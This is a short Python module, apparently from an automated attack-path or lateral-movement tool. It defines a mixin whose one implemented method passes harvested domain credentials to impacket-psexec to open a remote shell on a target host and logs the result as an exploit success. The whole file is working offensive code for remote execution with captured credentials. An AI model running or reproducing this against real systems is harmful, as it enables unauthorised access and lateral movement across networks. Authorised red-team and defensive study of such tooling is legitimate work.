# strategies/techniques/exec_techniques.py

"""
│   └── exec_techniques.py       ← remote execution
│       ├── _do_rdp
│       ├── _do_psremote
│       └── _do_psexec
"""

import subprocess
from entities.exploit_result import ExploitResult
from entities.credentials import Credential
from exceptions.hop_failed_error import HopFailedError
from services.printing import print_done

class ExecTechniquesMixin:

    def _do_psexec(self, creds: dict) -> ExploitResult:
        target = self.target.label.split("@")[0]
        secret = creds.get("secret", "")
        cmd = [
            "impacket-psexec",
            f"{creds['domain']}/{creds['username']}:{secret}@{target}",
            "-target-ip", creds["dc_ip"],
        ]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if proc.returncode != 0:
            raise HopFailedError(self.edge, proc.stderr)
        print_done(f"PSExec shell on {target}")
        return ExploitResult(
            technique="PSExec",
            edge=self.edge,
            success=True,
            notes=f"Shell obtained on {target}",
        )